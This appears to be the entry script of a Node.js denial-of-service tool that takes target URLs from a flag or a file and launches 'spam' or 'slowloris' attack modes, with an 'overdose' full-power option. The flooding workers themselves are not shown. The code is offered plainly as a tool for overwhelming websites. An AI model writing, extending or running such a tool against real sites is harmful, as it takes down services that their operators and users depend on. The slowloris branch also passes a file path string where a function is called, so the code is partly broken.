#!/usr/bin/env node
const { docopt } =      require('docopt');
const fs =              require('fs').promises;
const spammer         = require('./spammer');

const state = {};

const doc = `Usage:
    ./index.js -h  | --help
    ./index.js (-u | --url <url>) (-m | --mode <mode>) [-s | --sockets <sockets>] [ --overdose ]
    ./index.js (-f | --file <filepath>) (-m | --mode <mode>) [-s | --sockets <sockets>] [ --overdose ]
     

Options:
    -h --help          Show this screen
    -s --sockets       Count of sockets when using slowloris mode
    -m --mode          Mode of attack (spam | slowloris)
    --overdose         Enable full power (8+ RAM)
    -u --url           Url to use
    -f --file          Path to file with urls
`;

function setState({ url, success }){
    console.clear();
    if (success === 'socket') return console.log(JSON.parse(JSON.stringify(url)));
    if (state[url]?.[success]) state[url][success] += 1;
    else {
        state[url] = {
            ...state[url],
            [success]: 1
        }
    }
    return console.log(JSON.parse(JSON.stringify(state)));
}

async function parseFile(filepath){
    const data = (await fs.readFile(filepath, 'utf8')).split('\n');

    return data;
}

async function startBombarding({ urls, overdose, mode, sockets = 0 }){
    try {
        const workerFile = mode === 'spam' ? spammer : './slowloris.js';

        workerFile({ urls, overdose, sockets, setState });
    } catch(err) {
        console.log(err);
    }
}

(async () => {
    const {
        '<threads>'   : threads,
        '<url>'       : url,
        '<sockets>'   : sockets,
        '<mode>'      : mode,
        '--overdose'  : overdose,
        '<filepath>'  : filepath
    } = docopt(doc);

    const allowedMode = ['slowloris', 'spam'];

    if (!allowedMode.includes(mode)) throw new Error('Cannot find mode (spam | slowloris)');

    if (mode === 'slowloris' && !sockets) throw new Error('You must input count of sockets');
    
    let urls;

    if (filepath) urls = await parseFile(filepath);
    if (url) urls = [ url ];

    urls.forEach(url => {
        if (!url.includes('http://') && !url.includes('https://')) {
            console.log("The URL is not valid, please follow the formats: \n http://example.com \n http://192.134.63.13")
            process.exit(1);
        }
    });

    startBombarding({ urls, overdose, mode, sockets })
})();